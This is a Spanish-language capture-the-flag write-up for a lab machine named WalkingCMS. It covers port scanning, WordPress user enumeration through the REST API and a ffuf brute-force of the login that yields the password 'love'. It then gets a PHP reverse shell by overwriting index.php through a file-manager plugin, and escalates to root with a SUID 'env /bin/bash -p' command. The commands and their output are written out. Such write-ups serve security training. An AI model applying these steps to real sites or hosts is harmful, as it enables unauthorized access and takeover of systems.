# WalkingCMS - Writeup

## Reconocimiento

Comenzamos verificando conectividad con la máquina objetivo.

```bash
ping -c 4 172.17.0.2
```

Resultado:

```text
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.058 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.043 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.056 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.056 ms
```

El TTL 64 sugiere que estamos frente a un sistema Linux.

---

## Escaneo de puertos

Realizamos un escaneo completo con Nmap.

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

Resultado:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later
```

Solo encontramos un servicio HTTP expuesto.

---

## Enumeración web

La página principal muestra el sitio por defecto de Apache.

Procedemos a realizar fuzzing de directorios.

```bash
ffuf -w Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt \
-u http://172.17.0.2/FUZZ \
-v \
-recursion \
-e .php,.html \
-fs 10701
```

Entre todos los resultados obtenidos destacan los siguientes:

```text
/wordpress
/wordpress/wp-content
/wordpress/wp-login.php
```

Al acceder a `/wordpress` observamos una página llamada **Web Invulnerable**.

No encontramos funcionalidades interesantes para usuarios anónimos, por lo que continuamos enumerando WordPress.

---

## Enumeración de usuarios

WordPress tiene habilitada la API REST.

Accedemos a:

```text
http://172.17.0.2/wordpress/wp-json/wp/v2/users
```

Obteniendo:

```json
[
  {
    "id": 1,
    "name": "mario",
    "slug": "mario"
  }
]
```

Con esto identificamos el usuario:

```text
mario
```

---

## Fuerza bruta del login

El portal de autenticación se encuentra en:

```text
http://172.17.0.2/wordpress/wp-login.php
```

Observamos que no existe limitación de intentos ni rate limiting, por lo que realizamos un ataque de fuerza bruta utilizando ffuf.

```bash
ffuf -u "http://172.17.0.2/wordpress/wp-login.php" \
-X POST \
-d "log=mario&pwd=FUZZ&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2F172.17.0.2%2Fwordpress%2Fwp-admin%2F&testcookie=1" \
-H "Host: 172.17.0.2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "Cookie: wordpress_test_cookie=WP%20Cookie%20check" \
-w claves_top.txt:FUZZ \
-fc 200 \
-ac \
-c \
-t 200
```

Resultado:

```text
love    [Status: 302]
```

Credenciales válidas:

```text
mario:love
```

---

## Acceso al panel administrativo

Utilizando las credenciales obtenidas iniciamos sesión en:

```text
/wordpress/wp-admin
```

Una vez dentro del panel buscamos una forma de obtener ejecución remota de comandos.

---

## Obtención de RCE

Instalamos el plugin:

```text
WP File Manager
```

Este plugin permite visualizar y modificar archivos directamente desde la interfaz web.

Utilizamos una reverse shell PHP obtenida desde:

```text
https://www.revshells.com
```

Configuramos nuestra IP y el puerto 4343.

Posteriormente reemplazamos el contenido de:

```text
index.php
```

por el payload PHP generado.

---

## Reverse Shell

En nuestra máquina atacante iniciamos un listener.

```bash
nc -lnvp 4343
```

A continuación visitamos el archivo modificado.

```text
http://172.17.0.2/wordpress/index.php
```

Recibimos conexión:

```text
Connection received on 172.17.0.2 36830
```

Verificamos el usuario actual.

```bash
id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ya tenemos ejecución remota de comandos como `www-data`.

---

## Escalada de privilegios

Buscamos binarios SUID.

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
```

Entre los resultados encontramos:

```text
-rwsr-xr-x 1 root root 48536 Sep 20 2022 /usr/bin/env
```

Este binario aparece documentado en GTFOBins como susceptible de abuso cuando posee el bit SUID activado.

Ejecutamos:

```bash
/usr/bin/env /bin/bash -p
```

Comprobamos privilegios:

```bash
id
```

Resultado:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Finalmente:

```bash
whoami
```

```text
root
```

---

## Escalada completada

Se obtuvo acceso root mediante el abuso del binario SUID:

```text
/usr/bin/env
```

## Resumen

| Fase                 | Resultado             |
| -------------------- | --------------------- |
| Enumeración web      | WordPress descubierto |
| Enumeración usuarios | mario                 |
| Fuerza bruta         | mario:love            |
| Acceso inicial       | Panel administrativo  |
| RCE                  | PHP Reverse Shell     |
| Usuario obtenido     | www-data              |
| Escalada             | SUID env              |
| Usuario final        | root                  |

```
```
